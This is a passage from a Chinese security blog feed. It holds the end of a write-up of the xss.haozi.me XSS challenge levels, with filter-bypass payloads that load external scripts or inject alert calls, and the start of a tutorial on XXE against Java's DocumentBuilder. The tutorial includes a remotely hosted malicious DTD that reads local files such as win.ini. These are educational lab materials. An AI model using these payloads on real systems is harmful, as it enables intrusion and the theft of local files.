class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一题的基础上，过滤了&amp;、’、”、&lt;&gt;、/等字符。也就是说，不能通过闭合的形式构造payload执行了。</p><p>这里可以利用URL的@字符的特性来调用外部j.js。</p><p>一般的，当我们访问<a href="http://a.com@b.com" target="_blank" rel="noopener">http://a.com@b.com</a></p><p>实际是访问<a href="http://b.com" target="_blank" rel="noopener">http://b.com</a></p><p>虽然URL中的特殊符号会被过滤，但过滤后的HTML实体编码在HTML标签属性值中无影响，可以直接解析执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js</span><br></pre></td></tr></table></figure><p>但是我这里是没有成功执行的，原因待确定。</p><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将输入的字母全部转换成大写形式就直接传入h1标签中。</p><p>有几个tips：</p><ul><li>html标签大小写无影响；</li><li>js严格区分大小写。</li></ul><p>也就是说，不能直接构造js代码执行了，但这里可以利用script标签加载j.js，因为URL地址不受大小写影响且HTML标签不受大小写影响：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一题的基础上，替换了script字符串为空，且忽略大小写。</p><p>我们可以内嵌script来绕过：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">scriscriptpt</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了&lt;、/、”、’等字符为空，再将输入传入script标签中有注释符的alert()内。</p><p>先通过换行绕过注释符限制，用反引号`替换()，最后换行添加HTML注释 –&gt; 来注释掉后面的js代码（记住，在–&gt;前必须添加换行才会生效）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert`1`;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了以”&lt;”开头且紧接字母的字符串，将其在”&lt;”与字母中间添加下划线”_”。</p><p>这题需要解决两个问题：1. \&lt;s被正则替换坏了； 2. 大写的js无法正常运行。</p><p>这个确实不会搞，到网上看了下wp，发现还有这么个东西：“ſ 古英语中的s的写法, 转成大写是正常的S”。</p><p>那就直接将之前payload的s替换成 ſ 即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则对单双引号、&amp;、&lt;&gt;、/进行了HTML实体编码，再放置到img标签的onerror属性中。</p><p>但是，对HTML inline js转义就是做无用功，浏览器会先解析HTML，然后再解析js。</p><p>我们可以直接闭合前面的console.error()，添加;分号再注入alert语句即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">');alert('1</span><br><span class="line">或</span><br><span class="line">');alert(1)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接将输入放置到script标签的window.data中。</p><p>可以在前面通过引号随意赋值给window.data，以分号结束该js语句，再注入alert语句即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"";alert(1)</span><br></pre></td></tr></table></figure><p>可以闭合掉script标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span></span><br></pre></td></tr></table></figure><p>可以直接在window.data执行再赋值：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br><span class="line">或</span><br><span class="line">eval(alert(1))</span><br><span class="line">或</span><br><span class="line">eval("alert(1)")</span><br></pre></td></tr></table></figure><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很长的一段过滤，将反斜杠\、单双引号、&lt;&gt;、反引号`、斜杠/、换行符\n与\r、tab符\t、换页符\f、垂直制表符\v、空字符\O都在其前面添加反斜杠\进行转义，最后再放置到script标签中。</p><p>这里注意到<code>console.log(&quot;${s}&quot;)</code>，当我们输入双引号时，其实是输入\“，然后刚刚的代码就变成<code>console.log(&quot;\&quot;&quot;)</code>，这样输入的\“前面的反斜杠\直接放在双引号中被忽略掉了，起不到转义字符的作用，因此可以利用此直接构造：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">");alert("1</span><br><span class="line">或</span><br><span class="line">");alert(1)//</span><br><span class="line">或</span><br><span class="line">");alert(1);<span class="comment">&lt;!--</span></span><br></pre></td></tr></table></figure><p>中间的payload虽然//被转义为了\/\/，但转义之后还是//，不影响注释效果。</p><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了双引号，将其替换为\\“，再将输入放置到script标的console.log()中。</p><p>测试一下发现，当我们输入\“时，经过转义后为<code>console.log(&quot;\\&quot;&quot;)</code>，即将过滤时添加的转移符给转义了，从而绕过了转移符的转义功能，可构造如下payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\");alert(1)//</span><br><span class="line">或</span><br><span class="line">\");alert(1)</span><br><span class="line">--&gt;</span><br><span class="line">或</span><br><span class="line">\");alert(1)<span class="comment">&lt;!--</span></span><br></pre></td></tr></table></figure><p>另外，由于解析HTML标签的优先级高于解析JS的优先级，因此也可以直接闭合标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次的练习多是针对正则的绕过，学到一些新姿势，推荐练习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;这里写下haozi大佬的XSS闯关练习笔记。&lt;/p&gt;
&lt;p&gt;题目网址为：&lt;a href=&quot;https://xss.haozi.me/&quot; ta
      
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XML注入之DocumentBuilder</title>
    <link href="https://Mi1k7ea.github.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/"/>
    <id>https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/</id>
    <published>2019-02-13T14:19:12.000Z</published>
    <updated>2019-02-24T05:07:24.168Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为DocumentBuilder"><a href="#何为DocumentBuilder" class="headerlink" title="何为DocumentBuilder"></a>何为DocumentBuilder</h2><p>DocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。</p><h2 id="常规用法Demo"><a href="#常规用法Demo" class="headerlink" title="常规用法Demo"></a>常规用法Demo</h2><p>先定义一个user.xml，用于让DocumentBuilder来解析：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sex</span>&gt;</span>male<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"user.xml"</span>);</span><br><span class="line">        documentBuilder(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">documentBuilder</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">        DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilder builder=factory.newDocumentBuilder();</span><br><span class="line">            <span class="comment">//解析xml文档，先获取</span></span><br><span class="line">            Document doc=builder.parse(f);</span><br><span class="line">            <span class="comment">//通过user名字来获取dom节点</span></span><br><span class="line">            NodeList nodeList=doc.getElementsByTagName(<span class="string">"user"</span>);</span><br><span class="line">            Element e=(Element)nodeList.item(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//获取值</span></span><br><span class="line">            System.out.println(<span class="string">"姓名："</span>+e.getElementsByTagName(<span class="string">"name"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"性别："</span>+e.getElementsByTagName(<span class="string">"sex"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"年龄："</span>+e.getElementsByTagName(<span class="string">"age"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，发现成功解析了user.xml的内容：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/1.png" alt="demo"></p><h2 id="XML注入漏洞验证"><a href="#XML注入漏洞验证" class="headerlink" title="XML注入漏洞验证"></a>XML注入漏洞验证</h2><h3 id="1、测试是否支持解析DTD："><a href="#1、测试是否支持解析DTD：" class="headerlink" title="1、测试是否支持解析DTD："></a>1、测试是否支持解析DTD：</h3><p>创建test.xml，内容如下，主要添加了DTD即DOCTYPE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>测试代码中将user.xml改为test.xml。</p><p>运行代码，效果和Demo一样，即说明支持解析DTD。</p><p>这里注意一点，当进行的是黑盒测试时，未返回Error不代表就是可以解析XML，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装。</p><h3 id="2、测试是否支持解析普通实体："><a href="#2、测试是否支持解析普通实体：" class="headerlink" title="2、测试是否支持解析普通实体："></a>2、测试是否支持解析普通实体：</h3><p>修改test.xml内容如下，主要添加ELEMENT：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ELEMENT foo EMPTY&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>发现可以正常解析。</p><h3 id="3、测试是否支持解析参数实体："><a href="#3、测试是否支持解析参数实体：" class="headerlink" title="3、测试是否支持解析参数实体："></a>3、测试是否支持解析参数实体：</h3><p>修改test.xml内容如下，主要修改ELEMENT为ENTITY实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;&amp;foo;&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>运行代码，发现可正常解析，且成功进行了XML实体注入：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/2.png" alt="demo"></p><h3 id="4、测试是否支持解析外部实体："><a href="#4、测试是否支持解析外部实体：" class="headerlink" title="4、测试是否支持解析外部实体："></a>4、测试是否支持解析外部实体：</h3><p>修改test.xml内容如下，主要修改为SYSTEM执行访问外部链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;&amp;tea;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>在攻击者的服务器（这里自己开启一个Web服务）的Web目录放置一个Mi1k7ea.dtd文件，内容如下，读取本地C盘中的win.ini配置文件（若在Linux下读取”file:///etc/passwd”会报错，因为这种攻击方式受到XML中禁止字符的限制）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY tea SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br></pre></td></tr></table></figure><p>运行代码，在攻击者服务器看到目标程序访问了其中的恶意DTD文件：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/3.png" alt="demo"></p><p>发现成功通过远程加载解析DTD文件读取了本地文件内容：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/4.png" alt="demo"></p><p>当然，外部实体还有另一种写法，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY % milk SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt;</span><br><span class="line">        %milk;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;&amp;tea;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>运行结果和上面是一样的。</p><p>至此，我们知道DocumentBuilder是存在XML注入风险的，并且在未设置有效防御措施的时候可支持解析外部实体，即可进行XML外部实体注入攻击(XXE)。</p><h2 id="XXE攻击利用"><a href="#XXE攻击利用" class="headerlink" title="XXE攻击利用"></a>XXE攻击利用</h2><p>其实前面的测试过程已经是一些利用方式了，如读取本地敏感文件等，但是前提是该XML注入是有回显的。</p><p>这里示例测试一些常用的，其他的更详细的以后遇到再补充吧。</p><h3 id="1、DoS攻击"><a href="#1、DoS攻击" class="headerlink" title="1、DoS攻击"></a>1、DoS攻击</h3><p>在Java中，XXE的DoS攻击只对低版本的JDK有效，而高版本的JDK会进行防御。</p><h4 